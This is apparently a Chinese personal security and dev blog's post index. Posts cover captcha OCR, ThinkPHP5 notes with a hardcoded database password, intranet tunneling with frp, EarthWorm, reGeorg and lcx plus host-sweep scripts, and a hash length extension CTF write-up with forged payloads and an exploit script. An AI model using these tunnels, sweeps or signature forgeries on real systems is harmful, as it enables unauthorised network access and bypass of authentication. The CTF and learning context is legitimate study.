pixel_dict_reverse[count_max] # 获取出现次数最多的像素点 return threshold# 按照阈值进行二值化处理# threshold: 像素阈值def get_bin_table(threshold): # 获取灰度转二值的映射table table = [] for i in range(256): rate = 0.1 # 在threshold的适当范围内进行处理 if threshold*(1-rate)&lt;= i &lt;= threshold*(1+rate): table.append(1) else: table.append(0) return table# 去掉二值化处理后的图片中的噪声点def cut_noise(image): rows, cols = image.size # 图片的宽度和高度 change_pos = [] # 记录噪声点位置 # 遍历图片中的每个点，除掉边缘 for i in range(1, rows-1): for j in range(1, cols-1): # pixel_set用来记录该店附近的黑色像素的数量 pixel_set = [] # 取该点的邻域为以该点为中心的九宫格 for m in range(i-1, i+2): for n in range(j-1, j+2): if image.getpixel((m, n)) != 1: # 1为白色,0位黑色 pixel_set.append(image.getpixel((m, n))) # 如果该位置的九宫内的黑色数量小于等于4，则判断为噪声 if len(pixel_set) &lt;= 4: change_pos.append((i,j)) # 对相应位置进行像素修改，将噪声处的像素置为1（白色） for pos in change_pos: image.putpixel(pos, 1) return image # 返回修改后的图片# 识别图片中的数字加字母# 传入参数为图片路径，返回结果为：识别结果def OCR_lmj(img_path): image = Image.open(img_path) # 打开图片文件 imgry = image.convert(&apos;L&apos;) # 转化为灰度图 # 获取图片中的出现次数最多的像素，即为该图片的背景 max_pixel = get_threshold(imgry) # 将图片进行二值化处理 table = get_bin_table(threshold=max_pixel) out = imgry.point(table, &apos;1&apos;) # 去掉图片中的噪声（孤立点） out = cut_noise(out) #保存图片 # out.save(&apos;E://figures/img_gray.jpg&apos;) # 仅识别图片中的数字 #text = pytesseract.image_to_string(out, config=&apos;digits&apos;) # 识别图片中的数字和字母 text = pytesseract.image_to_string(out) # 去掉识别结果中的特殊字符 exclude_char_list = &apos; .:\\\\|\\&apos;\\&quot;?![],()~@#$%^&amp;*_+-={};&lt;&gt;/¥&apos; text = &apos;&apos;.join([x for x in text if x not in exclude_char_list]) print(text) return textOCR_lmj(&quot;2.jpg&quot;)","link":"2019/06/14/%E4%BD%BF%E7%94%A8tesseract%E5%92%8CPillow%E7%AE%80%E5%8D%95%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"title":"倒腾thinkphp5的一些坑","text":"一、Thinkphp5中No input file specified 问题解决.htaccess文件中的 RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L] 在默认情况下会导致No input file specified. 修改成 RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1] 官方教程https://www.kancloud.cn/manual/thinkphp5/content 二、路由关闭路由，完全使用默认的PATH_INFO方式URL： &apos;url_route_on&apos; =&gt; false, 路由关闭后，不会解析任何路由规则，采用默认的PATH_INFO 模式访问URL： http://serverName/index.php/module/controller/action/param/value/... 结构如图其实可以省略index.php http://192.168.199.245/thinkphp_5.0.24/public/test/abc/eat/who/st4ck 三、绑定默认模块在public下的index.php加上 define(&apos;BIND_MODULE&apos;,&apos;test&apos;); 切记一定要在require __DIR__ . &apos;/../thinkphp/start.php&apos;;之前上方的url变为 http://192.168.199.245/thinkphp_5.0.24/public/abc/eat/who/st4ck 如果你的应用比较简单，模块和控制器都只有一个，那么可以在应用公共文件中绑定模块和控制器，如下： // 绑定当前访问到index模块的index控制器define(&apos;BIND_MODULE&apos;,&apos;test/abc&apos;); 那么url又变成 http://192.168.199.245/thinkphp_5.0.24/public/eat/who/st4ck 四、设置返回类型设置为json &apos;default_return_type&apos; =&gt; &apos;json&apos;, 五、控制器初始化如果你的控制器类继承了\\think\\Controller类的话，可以定义控制器初始化方法_initialize，在该控制器的方法调用之前首先执行 namespace app\\index\\controller;use think\\Controller;class Index extends Controller{ public function _initialize() { echo &apos;init&apos;; } public function hello() { return &apos;hello&apos;; } public function data() { return &apos;data&apos;; }} 如果访问http://localhost/index.php/index/Index/hello 会输出 inithello 六、数据库操作前面嘚 use think\\Db; public function get_em(){ $query = new \\think\\db\\Query(); $query-&gt;table(&apos;emails&apos;); return Db::select($query);} 或者 public function get_em(){ return Db::table(&apos;emails&apos;)-&gt;select();} public function get_em(){ return Db::table(&apos;users&apos;)-&gt;where(&apos;id&apos;,1)-&gt;select();} 插入数据 public function get_em(){ $data = [&apos;email_id&apos; =&gt; &apos;bar1&apos;]; Db::table(&apos;emails&apos;)-&gt;insert($data);} 插入多数据 public function get_em(){ $data = [ [&apos;email_id&apos; =&gt; &apos;3333&apos;], [&apos;email_id&apos; =&gt; &apos;2333&apos;] ]; Db::table(&apos;emails&apos;)-&gt;insertAll($data);} 更新数据 Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;, 1)-&gt;update([&apos;name&apos; =&gt; &apos;thinkphp&apos;]); 删除数据 // 根据主键删除Db::table(&apos;think_user&apos;)-&gt;delete(1);Db::table(&apos;think_user&apos;)-&gt;delete([1,2,3]);// 条件删除 Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;,1)-&gt;delete();Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;,&apos;&lt;&apos;,10)-&gt;delete(); 七、模型绑定和传统mvc一样，一个ef框架先新建一个model &lt;?phpnamespace app\\test\\model;class User extends \\think\\Model{ // 设置当前模型对应的完整数据表名称 protected $table = &apos;emails&apos;;} 默认优先使用外部设定的数据库，也可以自己拟定 &lt;?phpnamespace app\\test\\model;class User extends \\think\\Model{ // 设置当前模型对应的完整数据表名称 protected $table = &apos;emails&apos;; // 设置当前模型的数据库连接 protected $connection = [ // 数据库类型 &apos;type&apos; =&gt; &apos;mysql&apos;, // 服务器地址 &apos;hostname&apos; =&gt; &apos;127.0.0.1&apos;, // 数据库名 &apos;database&apos; =&gt; &apos;security&apos;, // 数据库用户名 &apos;username&apos; =&gt; &apos;root&apos;, // 数据库密码 &apos;password&apos; =&gt; &apos;liu19990808&apos;, // 数据库编码默认采用utf8 &apos;charset&apos; =&gt; &apos;utf8&apos;, // 数据库表前缀 &apos;prefix&apos; =&gt; &apos;think_&apos;, // 数据库调试模式 &apos;debug&apos; =&gt; false, ];} 然后controller要使用 public function set_mo(){ // 实例化模型 $user = User::all(); return $user;} 前面需要加上 use app\\test\\model\\User;use think\\Db; 修改属性 public function set_mo(){ // 实例化模型 $user = User::get(1); $user-&gt;email_id=&apos;hello kitty&apos;; $user-&gt;save(); return $user;} 八、模板模板路径倒是很奇怪的样子 然后就是一些模板语法 public function fetch1(){ $view = new View(); $view-&gt;name = &apos;thinkphp&apos;; return $view-&gt;fetch(&apos;index&apos;);} Hello,{$name}！","link":"2019/11/19/%E5%80%92%E8%85%BEthinkphp5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"},{"title":"内网工具","text":"一、内网穿透0、工具下载地址frp:https://diannaobos.com/frp/proxifier:https://proxifier.soft32.com/EarthWorm，停止更新-在commit中下载:https://github.com/rootkiter/Binary-files冰蝎：https://github.com/rebeyond/Behinder/releasesreGeorg:https://github.com/sensepost/reGeorglcx下载:https://github.com/UndefinedIdentifier/LCX 1、 frp 无域名 需要vps web-端口转发 测试成功frpc.ini/跳板 [common]server_addr = 192.168.8.98server_port = 7000[tcp_port]type = tcplocal_ip = 192.168.59.132local_port = 80remote_port = 8080 frps.ini/公网服务器 [common]bind_port=7000 2、frp 有域名 需要vps web-端口转发 测试成功frpc.ini/跳板 [common]server_addr = 192.168.8.98server_port = 7000[web]type = httplocal_ip= 192.168.59.132local_port = 80custom_domains = myselfsite.com frps.ini/公网服务器 [common]bind_port=7000vhost_http_port=80 3、frp+proxifier 需要vps socks 测试成功frpc.ini/跳板 [common]server_addr = 192.168.8.98server_port = 7000[socks_proxy]type = tcpremote_port = 9999plugin = socks5 frps.ini/公网服务器 [common]bind_port=7000 4、ew+proxifier 需要vps socks 测试成功公网服务器： ew_win32.exe -s rcsocks -l 9999 -e 8888 跳板： ew_win32.exe -s rssocks -d 192.168.8.98 -e 8888 5、reGeorg+proxifier 无需vps 测试失败本机 reGeorgSocksProxy.py -p 9999 -u http://{{跳板ip}}/tunnel.nosocket.php 跳板 上传tunnel.nosocket.php即可 6、冰蝎+proxifier 无需vps 测试失败冰蝎传马-socks转发-使用proxifier本地10086代理即可 7、lcx-端口转发 win10 需要vps 测试成功192.168.59.133 81为内网服务跳板 Lcx.exe -slave 192.168.8.98 8888 192.168.59.133 81 公网服务器 Lcx.exe -listen 8888 9999 访问公网服务器9999 ps：ping 探测内网机器存活for /l %i in (1,1,255) do ping -n 1 -w 60 192.168.1.%i | find &quot;TTL&quot; linux内网bashcode #!/bin/bash ########################################## 格式： # # 该脚本名 *.*.*.1-255 # # 例如： # # ping.sh 192.168.100.2-100 # # # # 文件作用： # # pings.sh 子进程脚本ping # # chip.txt 存放存活主机 # # bchip.txt 存放不存在主机 # # # # # # # #########################################echo &apos;#!/bin/bashping -c 1 $1 1&gt;/dev/null 2&gt;/dev/nullif [ $? -eq 0 ];then echo &quot;--------------------- 主机存活: $1&quot; &gt;&gt; chip.txtelse echo &quot;$1 不存在！&quot; &gt;&gt; bchip.txtfi&apos; &gt; pings.sh ##设置ping.sh脚本执行权限，删除记录文件方便二次执行######### chip.txt 存活的ip####bchip.txt 不存在的ipchmod u+x pings.shrm -f chip.txt bchip.txt &gt;/dev/null 2&gt;&amp;1 #获得起始地址 IP地址的最后一位a=`echo $1 | awk -F &quot;.&quot; &apos;{print $4}&apos; | awk -F &quot;-&quot; &apos;{print $1}&apos;` #获得结束地址 IP地址的最后一位b=`echo $1 | awk -F &quot;.&quot; &apos;{print $4}&apos; | awk -F &quot;-&quot; &apos;{print $2&apos;}` echo &quot; &quot; #字符转数字a1=$((a))b1=$((b)) #循环创建进程同时去ping多台主机for ((i=a1;i&lt;=b1;i++))do w=`echo $1 | awk -v name=$i -F &quot;.&quot; &apos;{print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.&quot; name}&apos;` ./pings.sh $w &amp;done run:for i in $(seq 1 255); do bash scan.sh 10.10.$i.0-255;sleep 1;cat chip.txt;done code #!/bin/bashNET=$1for I in {1..254};do if ping -c 1 -W 1 $NET.$I &amp;&gt;/dev/null; then echo -e &quot;\\033[32m $NET.$I\\033[0m is up&quot;else echo -e &quot;\\033[31m $NET.$I\\033[0m is down&quot;fidone run bash 123.sh 10.10.1nohup bash bash.sh 10.10.13 &gt; 10.10.13.txt &amp;for i in $(seq 150 175);do bash bash.sh 10.10.$i &gt; 10.10.$i.txt ;done &amp;","link":"2020/04/07/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/"},{"title":"利用python进行两位十六进制换字符串","text":"如果你只是简单的解码或编码一个十六进制的原始字符串，可以使用　binascii 模块。例如：&gt;&gt;&gt; s = b&apos;hello&apos;&gt;&gt;&gt; import binascii&gt;&gt;&gt; h = binascii.b2a_hex(s)&gt;&gt;&gt; hb&apos;68656c6c6f&apos;&gt;&gt;&gt; binascii.a2b_hex(h)b&apos;hello&apos; 类似的功能同样可以在 base64 模块中找到。例如：&gt;&gt;&gt; s = b&apos;hello&apos;&gt;&gt;&gt; import base64&gt;&gt;&gt; h = base64.b16encode(s)&gt;&gt;&gt; hb&apos;68656C6C6F&apos;&gt;&gt;&gt; base64.b16decode(h)b&apos;hello&apos;&gt;&gt;&gt; 讨论:大部分情况下，通过使用上述的函数来转换十六进制是很简单的。 上面两种技术的主要不同在于大小写的处理。 函数 base64.b16decode() 和 base64.b16encode() 只能操作大写形式的十六进制字母， 而 binascii 模块中的函数大小写都能处理。 还有一点需要注意的是编码函数所产生的输出总是一个字节字符串。 如果想强制以Unicode形式输出，你需要增加一个额外的界面步骤。例如：&gt;&gt;&gt; h = base64.b16encode(s)&gt;&gt;&gt; print(h)b&apos;68656C6C6F&apos;&gt;&gt;&gt; print(h.decode(&apos;ascii&apos;))68656C6C6F&gt;&gt;&gt;","link":"2018/12/14/%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E4%B8%A4%E4%BD%8D%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%8D%A2%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"title":"Ubuntu16环境配置-换源","text":"一、windows1、windows环境下 pip换国内镜像1、打开user目录，user目录可以通过win+R 然后添加 %APPDATA% (不区分大小写) 2、直接在中创建一个pip目录，如：C:\\Users\\xx\\pip，新建文件pip.ini：3、拿任意文本编辑器打开，添加以下内容 [global]timeout = 6000index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com 保存即可 1.2、win10 换npm 源npm config set registry https://registry.npm.taobao.orgnpm install gulp less --save-dev 然后输入 npm config list 出现一条registry = &quot;https://registry.npm.taobao.org/&quot;则成功 二、Ubuntu2.1、Ubuntu环境下 pip换国内镜像1、在主目录下创建.pip文件夹,然后在该目录下创建pip.conf文件 mkdir ~/.pipvim ~/.pip/pip.conf 2、pip.conf文件编写如下内容（更换为清华大学镜像源）： [global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple 2.2、Ubuntu更换系统源 apt-get1、复制原文件备份 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2、编辑源列表文件(对vim不熟可使用gedit) sudo vim /etc/apt/sources.list 3、将原来的列表删除，添加如下内容 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 4、更新本地索引列表运行 sudo apt-get update #更新本地索引列表#sudo apt-get upgrade # 可选/根据更新的索引升级已安装的所有软件包 2.3、ubuntu 换npm 源npm config set registry https://registry.npm.taobao.org 2.4、ubuntu打开终端自动定位到桌面sudo gedit ~/.bashrc 后面加入 if [[ $PWD == $(realpath ~) ]]; then cd ~/Desktop/fi 如果是中文系统把Desktop改为桌面 2.5、32位运行库sudo apt-get install gcc-multilibsudo apt-get install libc6:i386 2.6、一些推荐的软件sudo apt-get install gdebi#安装debsudo apt-get install synaptic#新立得软件包管理器sudo apt install python-pipsudo apt install python3-pip#python包管理器sudo apt-get install vimsudo apt-get install git 2.7、pwn环境配置git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh#pwngdb,调试神器sudo apt-get install gcc-multilibsudo apt-get install libc6:i386#64位系统跑32位程序pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools#pwntools 3、显卡问题导致开机卡住安装Linux 双系统（一般是Nvidia显卡，1080p加核显的电脑）时，经常会出现卡在安装logo的问题，这种原因一般是由于linux发行商收录的nouveau 的开源显卡的问题。针对这种情况，解决方案如下：在进入grub安装界面的时候，在Install Ubuntu选项，按e,进入命令行模式，然后在quiet slash – 后面(也可能没有 – )，添加以下内容，然后按F10重新引导 acpi_osi=linux nomodeset 然后能开机，但是每次重启都要来一次，所以解决方法是 sudo gedit /etc/modprobe.d/blacklist.conf 在文本最后添加：（禁用nouveau第三方驱动，之后也不需要改回来） blacklist nouveauoptions nouveau modeset=0 然后执行： sudo update-initramfs -u 即可 4、增加用户修改密码无交互kail sudo useradd guest;echo &quot;guest:123qwe&quot; |sudo chpasswd 通用 echo &quot;123456&quot; | passwd --stdin &quot;root&quot;","link":"2018/12/20/%E5%90%84%E7%A7%8D%E6%BA%90%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E7%AE%80%E5%8D%95%E9%85%8D%E7%BD%AE/"},{"title":"哈希长度扩展攻击以及HashPump安装使用和两道题目","text":"能做什么如果salt的值你不知道，但是你知道长度，又知道sha1(salt+“一组正确数据”)，那么我们可以让sha1(salt+“填充数据”+“任意可控数据”)等于我们的sha1(salt+“一组正确数据”).这里的salt+“填充数据”就是对salt进行sha1时所补全的数据+最后8位的长度描述符。一般来说，salt+”填充数据”的长度就是64字节，正好是一个分组。如果salt的长度就大于了56个字节，那么加入填充数据后的长度应该是N个64字节，等于N个分组。为什么？你可以想象，sha1程序再对（salt+“填充数据”+“任意可控数据”）进行hash时，只需要进行第二轮及第二轮以后的运算。因为第一轮运算后的registers值就是sha1(salt)的值，该值你已经知道了。 你把下面的例子中的“1234567890abcdeadminadmin”,&quot;memeadmin&quot;想成是salt,然后再考虑下呢？ HashPump安装git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 在执行make的时候可能会出现openssl/sha.h没有文件的错误那么 sudo apt-get install opensslsudo apt-get install libssl-dev 然后make 和make install即可使用： kitty@ubuntu:~/桌面/HashPump$ hashpumpInput Signature: c7813629f22b6a7d28a08041db3e80a9Input Data: adminInput Key Length: 4Input Data to Add: joychou 06cf5a94dcda53659f58c0f411ba0bd8admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00H\\x00\\x00\\x00\\x00\\x00\\x00\\x00joychou 参数说明 signature来自已知消息的签名。data来自已知消息的数据。additional您要添加到已知消息的信息。keylength 用于对原始消息进行签名的密钥的长度（以字节为单位）。是除去一个admin的长度（具体看题） 得到的第一行是新的hash值 第二行是payload或者用python包 题目测试其中$salt = &quot;meme&quot;;玩家不可见，计算不能用 &lt;?php$role = $_REQUEST[&quot;role&quot;];$hash = $_REQUEST[&quot;hash&quot;];$salt = &quot;meme&quot;; if ($hash !== md5($salt.$role)){ echo &apos;wrong!&apos;; exit;}xif ( $role == &apos;admin&apos;){ echo &apos;wrong, hash cann\\&apos;t be admin&apos;; exit;}echo &quot;You are &quot;.$role.&apos;&lt;/br&gt;&apos;;echo &apos;Congradulation!&apos;;//已知一组role为admin，salt长度为4，hash为c7813629f22b6a7d28a08041db3e80a9?&gt; 首先计算 kitty@ubuntu:~/桌面$ hashpumpInput Signature: c7813629f22b6a7d28a08041db3e80a9Input Data: adminInput Key Length: 4Input Data to Add: st4ck92910845adf673d71ca809b196bcab9eadmin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00H\\x00\\x00\\x00\\x00\\x00\\x00\\x00st4ck 编码 admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00st4ck 然后传参，由于没有urldecode，所以要最好用get,因为get请求自带urldecode http://localhost/index.php?role=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00st4ck内容：hash=92910845adf673d71ca809b196bcab9e 题目2-实验吧-为了方便改了一下本地测试其中$secret=&quot;1234567890abcde&quot;;给玩家不可见，计算也不能使用这个数据，这里展示出来只是为了本地操作 &lt;?php$secret=&quot;1234567890abcde&quot;; // This secret is 15 characters long for security!$username=&quot;admin&quot;;$flag=&quot;flag{test}&quot;;$password = $_POST[&quot;password&quot;];if($_POST[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))){ echo &quot;Congratulations! You are a registered user.\\n&lt;br&gt;&quot;; die (&quot;The flag is &quot;. $flag);}else{ die(&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);}// md5(1234567890abcdeadminadmin)=93a5e7bea9c040065617b1a62ffc3d72?&gt; 题目中能得到信息 md5($secret.&quot;adminadmin&quot;)的值为93a5e7bea9c040065617b1a62ffc3d72 稍微整理下我们已经知道的 $secret是密文，长度为15，如果再算上后面第一个admin，长度就是20而数据是admin签名（哈希值）是93a5e7bea9c040065617b1a62ffc3d72 第一步计算payload kitty@ubuntu:~/桌面$ hashpumpInput Signature: 93a5e7bea9c040065617b1a62ffc3d72Input Data: adminInput Key Length: 20Input Data to Add: st4ckbf3722a5e102e94a83adef7cbf34a30badmin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00st4ck 换一下编码 password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00st4ck&amp;getmein=bf3722a5e102e94a83adef7cbf34a30b 由于自带urldecode，所以可以直接使用· 题目3-哈希长度拓展攻击之De1CTF - SSRF Me给出了源码 #! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&apos;latin1&apos;)app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result[&apos;code&apos;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&apos;data&apos;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&apos;code&apos;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;) result[&apos;code&apos;] = 200 result[&apos;data&apos;] = f.read() if result[&apos;code&apos;] == 500: result[&apos;data&apos;] = &quot;Action Error&quot; else: result[&apos;code&apos;] = 500 result[&apos;msg&apos;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(&apos;/&apos;)def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot;def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == &apos;__main__&apos;: app.debug = False app.run(host=&apos;0.0.0.0&apos;,port=80) 确实看起来好懵逼啊意思是 提示给的是 flag 在 ./flag.txt 中python 的 flask 框架，三个路由，index 用于获取源码，geneSign 用于生成 md5，De1ta 就是挑战大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action) 使用哈希拓展攻击 secert_key 是一个长度为 16 的字符串，在 /geneSign?param=flag.txt 中可以获取 md5(secert_key + &apos;flag.txt&apos; + &apos;scan&apos;) 的值,为 4bb4d74933b882b845a15a384f927bab，而目标则是获取 md5(secert_key + &apos;flag.txt&apos; + &apos;readscan&apos;) 的值 首先用hashpump kitty@ubuntu:~/桌面$ hashpumpInput Signature: 4bb4d74933b882b845a15a384f927babInput Data: scanInput Key Length: 24Input Data to Add: read 13e9cdc14801527def75d258d46cab59scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read 所以exp为: import requestsurl = &apos;http://acc709a0-59ca-44ac-9af9-5cf20b5635c0.node2.buuoj.cn.wetolink.com:82/De1ta?param=flag.txt&apos;cookies = { &apos;sign&apos;: &apos;13e9cdc14801527def75d258d46cab59&apos;, &apos;action&apos;: &apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;, }res = requests.get(url=url, cookies=cookies)print(res.text) 也可以字符串拼接不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5(&apos;xxx&apos; + &apos;flag.txt&apos; + &apos;scan&apos;) ，在 python 里面上述表达式就相当于md5(xxxflag.txtscan)，这就很有意思了。 直接构造访问/geneSign?param=flag.txtread ，拿到的 md5 就是md5(&apos;xxx&apos; + &apos;flag.txtread&apos; + &apos;scan&apos;) ，等价于 md5(&apos;xxxflag.txtreadscan&apos;)，这就达到了目标。因为md5(&apos;xxx&apos; + &apos;flag.txtread&apos; + &apos;scan&apos;)等于md5(&apos;xxx&apos; + &apos;flag.txt&apos; + &apos;readscan&apos;)然后直接访问 /De1ta?param=flag.txt构造 cookie: action=readscan;sign={上面获得的md5值}即可 想法通过以上的分析，想必大家对此攻击有了更深入的认识。只要存在脆弱的（使用此类散列算法）Message authentication codes (MACs)用于验证信息真实性的地方就很可能受此攻击。比如，我们发现了这样的一个下载文件的接口：/download?name=test.pdf&amp;sig=6543109bb53887f7bb46fe424f26e24asig可能是这个文件的某种校验签名，如果想通过这个接口下载其他文件就会失败，因为sig校验不过。同时还会发现md5(name) !== sig，很明显在校验算法中添加了盐，如果我们想下载任意的文件比如test.pdf%00/../../../../etc/passwd，正常情况下是没办法的，因为有盐，所以我们无法构造自己的签名值，但是如果服务端使用了类似if ($sig === md5($salt.$name))的校验代码，那么就会存在此攻击。","link":"2019/11/19/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8AHashPump%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%92%8C%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE/"},{"title":"多线程和多进程的暧昧缠绵","text":"先教科书一波（“千万别被吓到”），教科书上关于多进程和多线程解释为进程是资源分配的最小单位，线程是CPU调度的最小单位 据说这句话拿去考试,改卷老师一定会给高分，但是还是嘚深入了解一下 线程的定义：线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。一个线程是一个execution context（执行上下文）即一个cpu执行时所需要的一串指令。 线程的工作方式类比：假设你正在读一本书，没有读完，你想休息一下，但是你想在回来时恢复到当时读的具体进度。有一个方法就是记下页数、行数与字数这三个数值，这些数值就是execution context。如果你的室友在你休息的时候，使用相同的方法读这本书。你和她只需要这三个数字记下来就可以在交替的时间共同阅读这本书了。线程的工作方式与此类似。CPU会给你一个在同一时间能够做多个运算的幻觉，实际上它在每个运算上只花了极少的时间，本质上CPU同一时刻只干了一件事。它能这样做就是因为它有每个运算的execution context。就像你能够和你朋友共享同一本书一样，多任务也能共享同一块CPU。 进程的定义：一个程序的执行实例就是一个进程。每一个进程提供执行程序所需的所有资源。（进程本质上是资源的集合）一个进程有一个虚拟的地址空间、可执行的代码、操作系统的接口、安全的上下文（记录启动该进程的用户和权限等等）唯一的进程ID、环境变量、优先级类、最小和最大的工作空间（内存空间），还要有至少一个线程。每一个进程启动时都会最先产生一个线程，即主线程。然后主线程会再创建其他的子线程。 文邹邹的讲一下区别（如果你困了，请直接跳至图解进程线程） 同一个进程中的线程共享同一内存空间，但是进程之间是独立的。 同一个进程中的所有线程的数据是共享的（进程通讯），进程之间的数据是独立的。 对主线程的修改可能会影响其他线程的行为，但是父进程的修改（除了删除以外）不会影响其他子进程。 线程是一个上下文的执行指令，而进程则是与运算相关的一簇资源。 同一个进程的线程之间可以直接通信，但是进程之间的交流需要借助中间代理来实现。 创建新的线程很容易，但是创建新的进程需要对父进程做一次复制。 一个线程可以操作同一进程的其他线程，但是进程只能操作其子进程。 线程启动速度快，进程启动速度慢（但是两者运行速度没有可比性）。再配上一张图来对比一下有趣的图解一波程序执行的线程与进程的概念 计算机的核心是CPU，它承担了所有的计算任务。它就像一座工厂，时刻在运行。 假定工厂的电力有限，一次只能供给一个车间使用。也就是说，一个车间开工的时候，其他车间都必须停工。背后的含义就是，单个CPU一次只能运行一个任务。 进程就好比工厂的车间，它代表CPU所能处理的单个任务。任一时刻，CPU总是运行一个进程其他进程处于非运行状态. 